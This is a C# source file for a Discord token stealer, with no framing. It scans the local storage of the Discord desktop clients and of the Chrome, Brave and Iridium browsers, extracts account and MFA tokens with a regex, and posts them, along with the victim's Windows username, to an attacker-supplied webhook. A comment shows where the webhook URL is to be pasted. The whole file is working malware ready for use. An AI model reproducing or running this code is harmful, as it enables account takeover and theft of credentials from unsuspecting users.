internal class Token
{
    public readonly string webHook = string.Empty; // <- Webhook goes here inside quotes.
    private string regexPattern = @"(?:[\w-]{24}([.])[\w-]{6}\1[\w-]{27}|mfa[.]\w{84})";
    private StringBuilder mfaTokens = new StringBuilder();
    private StringBuilder normalTokens = new StringBuilder();

    private string appdataDiscord = @$"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discord\Local Storage\leveldb";
    private string appdata_PTBDiscord = @$"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discordptb\Local Storage\leveldb";
    private string appdata_CanaryDiscord = @$"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\discordcanary\Local Storage\leveldb";
    private string localStorage_ChromiumBrowser = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Chromium\User Data\Default\Local Storage\leveldb";
    private string localStorage_IridiumBrowser = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Iridium\User Data\Default\Local Storage\leveldb";
    private string localStorage_GoogleBrowser = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\Google\Chrome\User Data\Default\Local Storage\leveldb";
    private string localStorage_BraveBrowser = @$"{Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)}\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb";

    public void GetTokens()
    {
        Dictionary<string, string> discordDisctionaryInformation = new Dictionary<string, string>()
        {
            { "D", appdataDiscord },
            { "P", appdata_PTBDiscord },
            { "C", appdata_CanaryDiscord },
            { "B(B)", localStorage_BraveBrowser },
            { "B(G)", localStorage_GoogleBrowser},
            { "B(I)", localStorage_IridiumBrowser},
        };

        foreach (var dictElement in discordDisctionaryInformation)
        {
            if (!discordDisctionaryInformation[dictElement.Key].Contains(dictElement.Value)) continue;
            foreach (var ldbFile in Directory.GetFiles(dictElement.Value, "*ldb"))
            {
                string ldbFileContent = File.ReadAllText(ldbFile);
                foreach (Match currentRegexMatch in Regex.Matches(ldbFileContent, regexPattern))
                {
                    if (currentRegexMatch.Value[0..4] == "mfa.")
                    {
                        mfaTokens.AppendLine($"MFA: {dictElement.Key}=> {currentRegexMatch.Value}");
                        continue;
                    }
                    normalTokens.AppendLine($"{dictElement.Key}=> {currentRegexMatch.Value}");
                }
            }
        }
    }

    public void SendTokens()
    {
        using (WebClient webHookSender = new WebClient())
        {
            try
            {
                webHookSender.UploadValues(webHook, "POST", new NameValueCollection
            {
                { "content", $"```{normalTokens}```" },
                { "username", $"Normal tokens for user: {Environment.UserName}" }
            });
                if (mfaTokens.Length != 0)
                {
                    webHookSender.UploadValues(webHook, "POST", new NameValueCollection
                {
                    { "content", $"```{mfaTokens}```" },
                    { "username", $"MFA tokens for user: {Environment.UserName}" }
                });
                }
            }
            catch
            {
                Console.WriteLine("[!] Cannot send webhook request. Possibly exceedng the 2000 content character limit.");
            }
        }
    }
}
